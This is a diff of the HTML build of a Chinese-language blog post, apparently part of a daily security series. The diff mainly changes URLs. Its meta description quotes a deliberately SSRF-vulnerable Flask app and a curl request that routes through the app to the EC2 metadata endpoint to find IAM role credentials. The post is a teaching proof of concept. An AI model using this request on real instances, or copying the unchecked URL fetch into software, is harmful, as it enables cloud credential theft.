@@ -1,14 +1,14 @@
 <!DOCTYPE html>
 <html lang="en" dir="ltr">
-    <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset='utf-8'>
+    <head><meta charset='utf-8'>
 <meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content="寫一個簡單的SSRF漏洞 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 from flask import Flask, request import requests app = Flask(__name__) @app.route(&#34;/index&#34;) # 127.0.0.1/8000/index?url={URL} def follow_url(): url = request.args.get(&#34;url&#34;, &#34;&#34;) if url: return requests.get(url).text return &#34;no url parameter provided&#34; if __name__ == &#34;__main__&#34;: app.run(host=&#34;0.0.0.0&#34;, port=8000) 把這份含有SSRF漏洞的Web應用程式丟到EC2上面執行，因為是測試用直接python3 {執行檔}就好了，就不設定瀏覽器服務。 取得Instance MetaService Credential 雖然IMDS僅在實例內部可用，不能通過網絡從外部訪問。但是透過SSRF漏洞可以執行外部訪問IMDS憑證 查詢EC2 instance 是否有關聯的IAM role Request 1 curl /index?url=http://169.254.169.254/latest/meta-data/iam Output 1 info security-credentials/ 確定有關聯的IAM role">
 <title>[Day 22] 天堂雲端 - EC2 MetaService Credentials洩漏 by SSRF POC</title>
 
-<link rel='canonical' href='http://localhost:1313/p/day-22-%E5%A4%A9%E5%A0%82%E9%9B%B2%E7%AB%AF-ec2-metaservice-credentials%E6%B4%A9%E6%BC%8F-by-ssrf-poc/'>
+<link rel='canonical' href='https://windasunny.github.io/p/day-22-%E5%A4%A9%E5%A0%82%E9%9B%B2%E7%AB%AF-ec2-metaservice-credentials%E6%B4%A9%E6%BC%8F-by-ssrf-poc/'>
 
 <link rel="stylesheet" href="/scss/style.min.d8118f156935b64eca93aca758476adca858d2c47354971654d9bd2933a0e45f.css"><meta property='og:title' content="[Day 22] 天堂雲端 - EC2 MetaService Credentials洩漏 by SSRF POC">
 <meta property='og:description' content="寫一個簡單的SSRF漏洞 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 from flask import Flask, request import requests app = Flask(__name__) @app.route(&#34;/index&#34;) # 127.0.0.1/8000/index?url={URL} def follow_url(): url = request.args.get(&#34;url&#34;, &#34;&#34;) if url: return requests.get(url).text return &#34;no url parameter provided&#34; if __name__ == &#34;__main__&#34;: app.run(host=&#34;0.0.0.0&#34;, port=8000) 把這份含有SSRF漏洞的Web應用程式丟到EC2上面執行，因為是測試用直接python3 {執行檔}就好了，就不設定瀏覽器服務。 取得Instance MetaService Credential 雖然IMDS僅在實例內部可用，不能通過網絡從外部訪問。但是透過SSRF漏洞可以執行外部訪問IMDS憑證 查詢EC2 instance 是否有關聯的IAM role Request 1 curl /index?url=http://169.254.169.254/latest/meta-data/iam Output 1 info security-credentials/ 確定有關聯的IAM role">
-<meta property='og:url' content='http://localhost:1313/p/day-22-%E5%A4%A9%E5%A0%82%E9%9B%B2%E7%AB%AF-ec2-metaservice-credentials%E6%B4%A9%E6%BC%8F-by-ssrf-poc/'>
+<meta property='og:url' content='https://windasunny.github.io/p/day-22-%E5%A4%A9%E5%A0%82%E9%9B%B2%E7%AB%AF-ec2-metaservice-credentials%E6%B4%A9%E6%BC%8F-by-ssrf-poc/'>
 <meta property='og:site_name' content='Sunny Site'>
 <meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:tag' content='aws' /><meta property='article:tag' content='ec2' /><meta property='article:tag' content='imds' /><meta property='article:tag' content='SSRF' /><meta property='article:published_time' content='2023-10-05T00:00:00&#43;00:00'/><meta property='article:modified_time' content='2023-10-05T00:00:00&#43;00:00'/>
 <meta name="twitter:title" content="[Day 22] 天堂雲端 - EC2 MetaService Credentials洩漏 by SSRF POC">
@@ -225,11 +225,11 @@
 
                             <select name="language" title="language" onchange="window.location.href = this.selectedOptions[0].value">
                                 
-                                    <option value="http://localhost:1313/" selected>English</option>
+                                    <option value="https://windasunny.github.io/" selected>English</option>
                                 
-                                    <option value="http://localhost:1313/zh-tw/" >繁體中文</option>
+                                    <option value="https://windasunny.github.io/zh-tw/" >繁體中文</option>
                                 
-                                    <option value="http://localhost:1313/zh-cn/" >簡體中文</option>
+                                    <option value="https://windasunny.github.io/zh-cn/" >簡體中文</option>
                                 
                             </select>
                         </li>
@@ -675,7 +675,7 @@
         
             2020 - 
         
-        2024 sunny tsai
+        2025 sunny tsai
     </section>
     
     <section class="powerby">
